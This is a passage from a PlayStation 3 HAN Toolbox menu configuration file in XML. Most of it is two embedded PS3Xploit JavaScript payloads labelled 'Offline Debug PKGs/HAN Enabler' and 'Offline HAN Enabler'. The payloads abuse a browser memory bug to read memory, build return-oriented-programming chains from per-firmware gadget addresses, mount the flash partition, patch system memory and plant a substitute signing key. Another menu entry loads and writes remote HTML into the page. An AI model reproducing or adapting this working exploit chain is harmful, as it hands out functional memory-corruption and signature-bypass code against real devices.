				<Pair key="module_action"><String>javascript:eval('var ecdsa_key="948DA13E8CAFD5BA0E90CE434461BB327FE7E080475EAA0AD3AD4F5B6247A7FDA86DF69790196773",index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x=\047xxxx\047,flash_par="CELL_FS_IOS:BUILTIN_FLSH1",fs_fat="CELL_FS_FAT",mount_path="/dev_blind",xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,offset_array=[],t_out=0,ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,search_size=2*mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,mbytes=1048576,stat_size_offset=40,hr="\074hr\076",ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple")),ipf1_addr=7256944,ipf2_addr=5272436;document.write(\047\074html\076\074title\076PS3Xploit - Offline Debug PKGs/HAN Enabler by lmn7\074/title\076\074h1\076Enabling Debug PKGs and (partially) HAN...\074/h1\076\074div id="exploit"\076\074/div\076\074div id="trigger"\076\074/div\076\074/html\076\047); var toc_addr = 0x705610, vsh_opd_addr=0x6FBC28, vsh_opd_patch=0x096E14, vsh_ps3xploit_key_toc=0x717CA4, default_vsh_pub_toc=0x6FD664, gadget1_addr=0x0976BC, gadget8_addr=0x0200B4, gadget_mod1_addr=0x6161B8, gadget_mod2_addr=0x013B74, gadget_mod3_addr=0x0B8EB8, gadget_mod4a_addr=0x0DEBD8, gadget_mod7_addr=0x01A6AC, gadget_mod8_addr=0x2C24E0; if (fwv == "4.81") { gadget_mod8_addr=0x2C24DC; } else if (fwv == "4.82") { toc_addr = 0x705640; vsh_opd_addr=0x6FBC58; vsh_ps3xploit_key_toc=0x7180DC; default_vsh_pub_toc=0x6FD694; gadget_mod1_addr=0x616B54; } else if (fwv == "4.84") { toc_addr = 0x705648; vsh_opd_addr=0x6FBC60; vsh_ps3xploit_key_toc=0x7181D4; default_vsh_pub_toc=0x6FD69C; gadget_mod1_addr=0x616BF4; } function hexh2bin(a){return String.fromCharCode(a)}function hexw2bin(a){return String.fromCharCode(a\076\07616)+String.fromCharCode(a)}function hexdw2bin(a){return hexw2bin(0)+hexw2bin(a)}String.prototype.convertedSize=function(a){if(this.length\0741){return 0}var b=\047\047;if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\04700\047}if(b.substr(b.length-3,2)!==\04700\047){b+=\0470000\047}return b.length/2};String.prototype.toHex16=function(){return(\0470000\047+this).substr(-4)};String.prototype.toAscii=function(a){var b=\047\047;var i=0;while(i\074this.length){if(a===true){b+=this.charCodeAt(i).toString(16).toHex16()}else{b+=this.charCodeAt(i).toString(16)}i+=1}return b};String.prototype.convert=function(a){if(this.length\0741){return\047\047}var b=\047\047;var c=\047\047;var i=0;var d=[];if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\04700\047}if(b.substr(b.length-3,2)!==\04700\047){b+=\0470000\047}while(i\074b.length){c=b.substr(i,4);d.push(String.fromCharCode(parseInt(c,16)));i+=4}return d.join(\047\047)};String.prototype.replaceAt=function(a,b){return this.substr(0,a)+b+this.substr(a+b.length)};String.prototype.repeat=function(a){return new Array(a+1).join(this)};Number.prototype.noExponents=function(){var a=String(this).split(/[eE]/);if(a.length===1){return a[0]}var z=\047\047,sign=this\0740?\047-\047:\047\047,str=a[0].replace(\047.\047,\047\047),mag=Number(a[1])+1;if(mag\0740){z=sign+\0470.\047;while(mag++){z+=\0470\047}return z+str.replace(/^\-/,\047\047)}mag-=str.length;while(mag--){z+=\0470\047}return str+z};function fromIEEE754(a,b,c){var d=0;var g=[];var i;var j;var h;for(i=a.length;i;i-=1){h=a[i-1];for(j=8;j;j-=1){g.push(h%2?1:0);h=h\076\0761}}g.reverse();var k=g.join(\047\047);var l=(1\074\074(b-1))-1;var s=parseInt(k.substring(0,1),2)?-1:1;var e=parseInt(k.substring(1,1+b),2);var f=parseInt(k.substring(1+b),2);if(e===(1\074\074b)-1){d=f!==0?NaN:s*Infinity}else if(e\0760){d=s*Math.pow(2,e-l)*(1+f/Math.pow(2,c))}else if(f!==0){d=s*Math.pow(2,-(l-1))*(f/Math.pow(2,c))}else{d=s*0}return d.noExponents()}function generateIEEE754(a,b){var c=new Array((a\076\07624)&0xFF,(a\076\07616)&0xFF,(a\076\0768)&0xFF,(a)&0xFF,(b\076\07624)&0xFF,(b\076\07616)&0xFF,(b\076\0768)&0xFF,(b)&0xFF);return fromIEEE754(c,11,52)}function generateExploit(a,b){var n=(a\074\07432)|((b\076\0761)-1);return generateIEEE754(a,(n-a))}function readMemory(a,b){if(document.getElementById(\047exploit\047)){document.getElementById(\047exploit\047).style.src="local("+generateExploit(a,b)+")"}}function checkMemory(a,b,c){if(document.getElementById(\047exploit\047)){readMemory(a,b);return document.getElementById(\047exploit\047).style.src.substr(6,c)}}function trigger(a){if(document.getElementById(\047trigger\047)){document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+a.toString(16)+")")}}function load_check(){if(total_loops\074max_loops){t_out=setTimeout(initROP,1000,false)}else{total_loops=0;t_out=0}}function findJsVariableOffset(a,b,c,d){readMemory(c,d);var e=document.getElementById(\047exploit\047).style.src.substr(6,d);var i=0;var t;var k;var f;var g;while(i\074(e.length*2)){if(e.charCodeAt(i/2)===b.charCodeAt(0)){f=0;for(k=0;k\074(b.length*2);k+=0x2){if(e.charCodeAt((i+k)/2)!==b.charCodeAt(k/2)){break}f+=1}if(f===b.length){g=c+i+4;for(t=0;t\074offset_array.length;t+=1){if(offset_array[t]===g){return-1}}offset_array.push(g);return g}}i+=0x10}var h=c+d;return 0}function memcpy(a,b,c){return callsub(gadget8_addr,a,b,c,0,0,0,0,0,0,0x70)}function store_word(a,b,c,d,e){c=gtemp_addr;d=gtemp_addr;e=gtemp_addr;return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(b)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(a-0xC74)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod7_addr)+fill_by_16bytes(0x70,dbyte41)+hexdw2bin(c)+hexdw2bin(d)+hexdw2bin(e)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function stack_frame_hookup(){return unescape("\\u4141\\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41)}function stack_frame_exit(){return hexdw2bin(gadget_mod8_addr)+unescape("\\u2F2A")}function syscall(a,b,c,d,e,f,g,h,i,j){if(j===null){j=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(a)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(j)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function callsub(a,b,c,d,e,f,g,h,i,j,k,l,m){var n=0x20;if(m===null){m=gtemp_addr}if(l===null){l=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(j)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(l)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(a)+fill_by_16bytes(k-n,dbyte00)+hexdw2bin(m)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function fill_by_4bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/4){c+=e.repeat(2);d++}return c}function fill_by_8bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/8){c+=e.repeat(4);d++}return c}function fill_by_16bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/16){c+=e.repeat(8);d++}return c}function initROP(a){try{if(a===true){frame_fails=0;search_base_off=0;search_size_ext=0}if(t_out!==0){clearTimeout(t_out);t_out=0}offset_array=[];xtra_data_addr=0;stack_frame_addr=0;jump_2_addr=0;jump_1_addr=0;ecdsa_key_addr=0;index_key_addr=0;search_max_threshold=70*0x100000;search_base=0x80200000;search_size=2*mbytes;search_size_ext=0*mbytes;search_base_off=0*mbytes;total_loops++;xtra_data=start_x.convert()+ecdsa_key.convert(true)+index_key.convert(true)+flash_par.convert()+fs_fat.convert()+mount_path.convert()+unescape("\\uFD7E");while(xtra_data_addr===0){if(search_max_threshold\074search_size){load_check();return}xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}ecdsa_key_addr=xtra_data_addr+start_x.convertedSize()-0x4;index_key_addr=ecdsa_key_addr+ecdsa_key.convertedSize(true);flash_par_addr=index_key_addr+index_key.convertedSize(true);fs_fat_addr=flash_par_addr+flash_par.convertedSize();mount_path_addr=fs_fat_addr+14;stack_frame=stack_frame_hookup()+syscall(0x345,flash_par_addr,fs_fat_addr,mount_path_addr,0,0,0,0,0)+store_word(vsh_opd_addr,vsh_opd_patch)+store_word(default_vsh_pub_toc,vsh_ps3xploit_key_toc)+memcpy(vsh_ps3xploit_key_toc-0x20,index_key_addr,(index_key.length/2))+memcpy(vsh_ps3xploit_key_toc,ecdsa_key_addr,(ecdsa_key.length/2))+stack_frame_exit();while(stack_frame_addr===0){if(search_max_threshold\074search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0}load_check();return}stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(stack_frame_addr==-1)if(search_max_threshold\074search_size+search_size_ext){frame_fails++;load_check();return}search_max_threshold-=search_size+search_size_ext}jump_2=unescape("\\u0102\\u7EFB")+fill_by_16bytes(0x30,0x8282)+hexw2bin(stack_frame_addr)+unescape("\\uFB7E");while(jump_2_addr===0){if(search_max_threshold\074search_size){load_check();return}jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(jump_2_addr==-1)if(search_max_threshold\074search_size){load_check();return}search_max_threshold-=search_size}jump_1=unescape("\\u4141\\u7EFA")+hexw2bin(jump_2_addr)+unescape("\\uFA7E");while(jump_1_addr===0){if(search_max_threshold\074search_size){load_check();return}jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(jump_1_addr==-1)if(search_max_threshold\074search_size){load_check();return}search_max_threshold-=search_size}var b=checkMemory(stack_frame_addr-0x4,0x8000,stack_frame.length);var x=checkMemory(xtra_data_addr-0x4,0x1000,xtra_data.length);var c=checkMemory(jump_2_addr-0x4,0x1000,jump_2.length);var d=checkMemory(jump_1_addr-0x4,0x1000,jump_1.length);if((c===jump_2)&&(d===jump_1)&&(x===xtra_data)&&(b===stack_frame)){if(t_out!==0){clearTimeout(t_out)}triggerX()}else{load_check()}}catch(e){}}function triggerX(){setTimeout(trigger,50,jump_1_addr);setTimeout(window.close,250)}initROP(true);');</String></Pair>
			</Table>
			<Table key="han_enabler_auto_dex_offline">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/han_enable.png</String></Pair>
				<Pair key="title"><String>Offline HAN Enabler</String></Pair>
				<Pair key="info"><String>Enable custom signed packages and licenses</String></Pair>
				<Pair key="module_name"><String>webrender_plugin</String></Pair>
				<Pair key="module_action"><String>javascript:eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,debug=!1,ps3xploit_ecdsa_key="948DA13E8CAFD5BA0E90CE434461BB327FE7E080475EAA0AD3AD4F5B6247A7FDA86DF69790196773",index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,search_size=2*mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,mbytes=1048576,stat_size_offset=40,hr="\074hr\076",ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple")),ipf1_addr=0x6ebb70,ipf2_addr=0x507374;document.write(\047\074html\076\074head\076\074title\076PS3Xploit - Offline HAN Enabler by lmn7\074/title\076\074/head\076\074body id="bodyId" style="background-color:#FFFFFF"\076\074div id="headerId"\076\074h1\076Enabling HAN...\074/h1\076\074span id="hideme" style="visibility:hidden"\076\074p\076\074button id="btnROP" type="button" onclick="initROP(true);" autofocus\076Initialize\074/button\076 | Close \074input type="checkbox" id="auto_close" name="aclose" checked="checked" onclick="autoclose();"/\076\074span id="dex_txt" style="visibility:hidden"\076\074input type="checkbox" id="dex" name="DEX" disabled="" onclick="dex();"/\076\074/span\076\074/p\076\074p\076\074button id="btnTrigger" disabled="" type="button" onclick="triggerX();"\076En\074/button\076\074span id="reset" style="visibility:hidden"\076 | \074button id="btnReset" type="button" onclick="disable_trigger();"\076Reset\074/button\076\074/span\076\074/p\076\074/span\076\074div id="exploit" \076\074/div\076\074div id="trigger"\076\074/div\076\074/body\076\074/html\076\047); var toc_addr = 0x705610, vsh_opd_patch=0x096E14, vsh_ps3xploit_key_toc=0x717CA4, default_vsh_pub_toc=0x6FD664, toc_entry1_addr=0x6EA4B8, toc_entry3_addr=0x6EA4B0, toc_entry5_addr=0x6FB780, gadget1_addr=0x0976BC, gadget8_addr=0x0200B4, gadget_mod1_addr=0x6161B8, gadget_mod2_addr=0x013B74, gadget_mod3_addr=0x0B8EB8, gadget_mod4a_addr=0x0DEBD8, gadget_mod7_addr=0x01A6AC, gadget_mod8_addr=0x2C24E0, ipf1_addr=0x6FBC60, ipf2_addr=0x50EF68; if (fwv == "4.81") { gadget_mod8_addr=0x2C24DC; } else if (fwv == "4.82") { toc_addr = 0x705640; vsh_ps3xploit_key_toc=0x7180DC; default_vsh_pub_toc=0x6FD694; toc_entry5_addr=0x6FB7B0; gadget_mod1_addr=0x616B54; } else if (fwv == "4.84") { toc_addr = 0x705648; vsh_ps3xploit_key_toc=0x7181D4; default_vsh_pub_toc=0x6FD69C; toc_entry5_addr=0x6FB7B8; gadget_mod1_addr=0x616BF4; ipf1_addr=0x6fbc68; } function hexh2bin(a){return String.fromCharCode(a)}function hexw2bin(a){return String.fromCharCode(a\076\07616)+String.fromCharCode(a)}function hexdw2bin(a){return hexw2bin(0)+hexw2bin(a)}String.prototype.toHex16=function(){return(\0470000\047+this).substr(-4)};String.prototype.toAscii=function(a){var b=\047\047;var i=0;while(i\074this.length){if(a===true){b+=this.charCodeAt(i).toString(16).toHex16()}else{b+=this.charCodeAt(i).toString(16)}i+=1}return b};String.prototype.convert=function(a){if(this.length\0741){return\047\047}var b=\047\047;var c=\047\047;var i=0;var d=[];if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\04700\047}if(b.substr(b.length-3,2)!==\04700\047){b+=\0470000\047}while(i\074b.length){c=b.substr(i,4);d.push(String.fromCharCode(parseInt(c,16)));i+=4}return d.join(\047\047)};String.prototype.convertedSize=function(a){if(this.length\0741){return 0}var b=\047\047;if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\04700\047}if(b.substr(b.length-3,2)!==\04700\047){b+=\0470000\047}return b.length/2};String.prototype.replaceAt=function(a,b){return this.substr(0,a)+b+this.substr(a+b.length)};String.prototype.repeat=function(a){return new Array(a+1).join(this)};Number.prototype.noExponents=function(){var a=String(this).split(/[eE]/);if(a.length===1){return a[0]}var z=\047\047,sign=this\0740?\047-\047:\047\047,str=a[0].replace(\047.\047,\047\047),mag=Number(a[1])+1;if(mag\0740){z=sign+\0470.\047;while(mag++){z+=\0470\047}return z+str.replace(/^\-/,\047\047)}mag-=str.length;while(mag--){z+=\0470\047}return str+z};function fromIEEE754(a,b,c){var d=0;var g=[];var i;var j;var h;for(i=a.length;i;i-=1){h=a[i-1];for(j=8;j;j-=1){g.push(h%2?1:0);h=h\076\0761}}g.reverse();var k=g.join(\047\047);var l=(1\074\074(b-1))-1;var s=parseInt(k.substring(0,1),2)?-1:1;var e=parseInt(k.substring(1,1+b),2);var f=parseInt(k.substring(1+b),2);if(e===(1\074\074b)-1){d=f!==0?NaN:s*Infinity}else if(e\0760){d=s*Math.pow(2,e-l)*(1+f/Math.pow(2,c))}else if(f!==0){d=s*Math.pow(2,-(l-1))*(f/Math.pow(2,c))}else{d=s*0}return d.noExponents()}function generateIEEE754(a,b){var c=new Array((a\076\07624)&0xFF,(a\076\07616)&0xFF,(a\076\0768)&0xFF,(a)&0xFF,(b\076\07624)&0xFF,(b\076\07616)&0xFF,(b\076\0768)&0xFF,(b)&0xFF);return fromIEEE754(c,11,52)}function generateExploit(a,b){var n=(a\074\07432)|((b\076\0761)-1);return generateIEEE754(a,(n-a))}function readMemory(a,b){if(document.getElementById(\047exploit\047)){document.getElementById(\047exploit\047).style.src="local("+generateExploit(a,b)+")"}}function checkMemory(a,b,c){if(document.getElementById(\047exploit\047)){readMemory(a,b);if(debug===true){var x=document.getElementById(\047exploit\047).style.src.substr(6,c);return x}return document.getElementById(\047exploit\047).style.src.substr(6,c)}}function trigger(a){if(document.getElementById(\047trigger\047)){document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+a.toString(16)+")")}}function rop_exit(a){var b=document.getElementById(\047auto_close\047);if(b){if(b.checked===true)window.close()}}function load_check(){if(total_loops\074max_loops){t_out=setTimeout(initROP,1000,false)}else{total_loops=0;t_out=0}}function findJsVariableOffset(a,b,c,d){readMemory(c,d);var e=document.getElementById(\047exploit\047).style.src.substr(6,d);var i=0;var t;var k;var f;var g;while(i\074(e.length*2)){if(e.charCodeAt(i/2)===b.charCodeAt(0)){f=0;for(k=0;k\074(b.length*2);k+=0x2){if(e.charCodeAt((i+k)/2)!==b.charCodeAt(k/2)){break}f+=1}if(f===b.length){g=c+i+4;for(t=0;t\074offset_array.length;t+=1){if(offset_array[t]===g){return-1}}offset_array.push(g);return g}}i+=0x10}var h=c+d;return 0}function memcpy(a,b,c){return callsub(gadget8_addr,a,b,c,0,0,0,0,0,0,0x70)}function store_word(a,b,c,d,e){if(c===null){c=gtemp_addr}if(d===null){d=gtemp_addr}if(e===null){e=gtemp_addr}return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(b)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(a-0xC74)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod7_addr)+fill_by_16bytes(0x70,dbyte41)+hexdw2bin(c)+hexdw2bin(d)+hexdw2bin(e)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function stack_frame_hookup(){return unescape("\\u4141\\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41)}function stack_frame_exit(){return hexdw2bin(gadget_mod8_addr)+unescape("\\u2F2A")}function syscall(a,b,c,d,e,f,g,h,i,j){if(j===null){j=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(a)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(j)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function callsub(a,b,c,d,e,f,g,h,i,j,k,l,m){var n=0x20;if(m===null){m=gtemp_addr}if(l===null){l=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(j)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(l)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(a)+fill_by_16bytes(k-n,dbyte00)+hexdw2bin(m)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function fill_by_4bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/4){c+=e.repeat(2);d++}return c}function fill_by_8bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/8){c+=e.repeat(4);d++}return c}function fill_by_16bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/16){c+=e.repeat(8);d++}return c}function initDefaults(){offset_array=[];xtra_data_addr=0;stack_frame_addr=0;jump_2_addr=0;jump_1_addr=0;ps3xploit_ecdsa_key_addr=0;index_key_addr=0;search_max_threshold=70*0x100000;search_base=0x80100000;search_size=2*mbytes;search_size_ext=0*mbytes;search_base_off=0*mbytes;total_loops++}function initROP(a){try{if(a===true){frame_fails=0;search_base_off=0;search_size_ext=0}if(t_out!==0){clearTimeout(t_out);t_out=0}initDefaults();xtra_data=start_x.convert()+ps3xploit_ecdsa_key.convert(true)+index_key.convert(true)+unescape("\\uFD7E");while(xtra_data_addr===0){if(search_max_threshold\074search_size){load_check();return}xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}ps3xploit_ecdsa_key_addr=xtra_data_addr+start_x.convertedSize()-0x4;index_key_addr=ps3xploit_ecdsa_key_addr+ps3xploit_ecdsa_key.convertedSize(true);stack_frame=stack_frame_hookup()+store_word(toc_entry1_addr,vsh_opd_patch+4)+store_word(toc_entry3_addr,vsh_opd_patch+4)+store_word(toc_entry5_addr,vsh_opd_patch+4)+store_word(ipf1_addr,ipf2_addr)+store_word(default_vsh_pub_toc,vsh_ps3xploit_key_toc)+memcpy(vsh_ps3xploit_key_toc-0x20,index_key_addr,(index_key.length/2))+memcpy(vsh_ps3xploit_key_toc,ps3xploit_ecdsa_key_addr,(ps3xploit_ecdsa_key.length/2))+stack_frame_exit();while(stack_frame_addr===0){if(search_max_threshold\074search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0}load_check();return}stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(stack_frame_addr==-1)if(search_max_threshold\074search_size+search_size_ext){frame_fails++;load_check();return}search_max_threshold-=search_size+search_size_ext}jump_2=unescape("\\u0102\\u7EFB")+fill_by_16bytes(0x30,0x8282)+hexw2bin(stack_frame_addr)+unescape("\\uFB7E");while(jump_2_addr===0){if(search_max_threshold\074search_size){load_check();return}jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(jump_2_addr==-1)if(search_max_threshold\074search_size){load_check();return}search_max_threshold-=search_size}jump_1=unescape("\\u4141\\u7EFA")+hexw2bin(jump_2_addr)+unescape("\\uFA7E");while(jump_1_addr===0){if(search_max_threshold\074search_size){load_check();return}jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(jump_1_addr==-1)if(search_max_threshold\074search_size){load_check();return}search_max_threshold-=search_size}var b=checkMemory(stack_frame_addr-0x4,0x8000,stack_frame.length);var x=checkMemory(xtra_data_addr-0x4,0x1000,xtra_data.length);var c=checkMemory(jump_2_addr-0x4,0x1000,jump_2.length);var d=checkMemory(jump_1_addr-0x4,0x1000,jump_1.length);if((c===jump_2)&&(d===jump_1)&&(x===xtra_data)&&(b===stack_frame)){if(t_out!==0){clearTimeout(t_out)}triggerX()}else{load_check()}}catch(e){debug=true;debug=false}}function triggerX(){setTimeout(trigger,1000,jump_1_addr);setTimeout(rop_exit,2000,hr);setTimeout(window.close,2000);t_out=0;total_loops=0}initROP(true);');</String></Pair>
			</Table>
			<Table key="han_functions_dex">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/han.png</String></Pair>
				<Pair key="title"><String>HAN Functions</String></Pair>
				<Pair key="info"><String>Online, Offline and Locally Hosted autorun HAN functions</String></Pair>
			</Table>
			<Table key="whats_new_browser_dex">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/dadi590_whats_new_browser.png</String></Pair>
				<Pair key="title"><String>What's New on Browser</String></Pair>
				<Pair key="info"><String>Check the the most recent console jailbreaking news</String></Pair>
				<Pair key="module_name"><String>webrender_plugin</String></Pair>
				<Pair key="module_action"><String>javascript: var news_code_URL = "https://raw.githubusercontent.com/DADi590/Console-news-on-consoles/master/PSX_Place/PS3/news_page_code.html"; function httpGet(url) { if (window.XMLHttpRequest) { xmlhttp = new XMLHttpRequest(); } else { xmlhttp = new ActiveXObject("Microsoft.XMLHTTP"); } xmlhttp.onreadystatechange = function() { if (xmlhttp.readyState == 4 && xmlhttp.status == 200) { document.write(""); document.write(xmlhttp.responseText); } }; try { xmlhttp.open("GET", url, true); xmlhttp.send(); } catch (err) { alert("This browser seems not to be compatible. Error: " + err); } } httpGet(news_code_URL);</String></Pair>
			</Table>
			<Table key="han_external_content_dex">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/server.png</String></Pair>
				<Pair key="title"><String>External Content</String></Pair>
				<Pair key="info"><String>Download and install content from remote servers</String></Pair>
			</Table>
			<Table key="han_advanced_menu">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/setup.png</String></Pair>
				<Pair key="title"><String>Advanced Tools</String></Pair>
				<Pair key="info"><String>Be careful with items in here</String></Pair>
			</Table>
			<Table key="han_toolbox_setup">
				<Pair key="icon"><String>http://raw.githubusercontent.com/ShaolinAssassin/HAN-Toolbox/master/update_status/v0.7.1-settings.png</String></Pair>
				<Pair key="title"><String>Toolbox Settings</String></Pair>
				<Pair key="info"><String>Version info, Resources download, Updates, Languages</String></Pair>
			</Table>
		</Attributes>
		<Items>
			<Query 
				class="type:x-xmb/module-action"
				key="han_reboot_soft_offline_dex"
				attr="han_reboot_soft_offline_dex"
				/>
			<Query 
				class="type:x-xmb/module-action"
				key="han_debug_han_offline_dex"
				attr="han_debug_han_offline_dex"
				/>
			<Query 
				class="type:x-xmb/module-action"
				key="han_enabler_auto_dex_offline"
				attr="han_enabler_auto_dex_offline"
				/> 
			<Query 
				class="type:x-xmb/folder-pixmap"
				key="han_functions_dex"
				attr="han_functions_dex"
				src="#han_functions_items_dex"
				/>
			<Query 
				class="type:x-xmb/module-action"
				key="whats_new_browser_dex"
				attr="whats_new_browser_dex"
				/>
			<Query 
				class="type:x-xmb/folder-pixmap" 
				key="han_external_content_dex" 
				attr="han_external_content_dex"
				src="xmb://localhost/dev_hdd0/game/HANTOOLBX/USRDIR/XMLS/han_toolbox_external_content.xml#han_external_content_dex_main"
				/>
			<Query 
				class="type:x-xmb/folder-pixmap" 
				key="han_advanced_menu" 
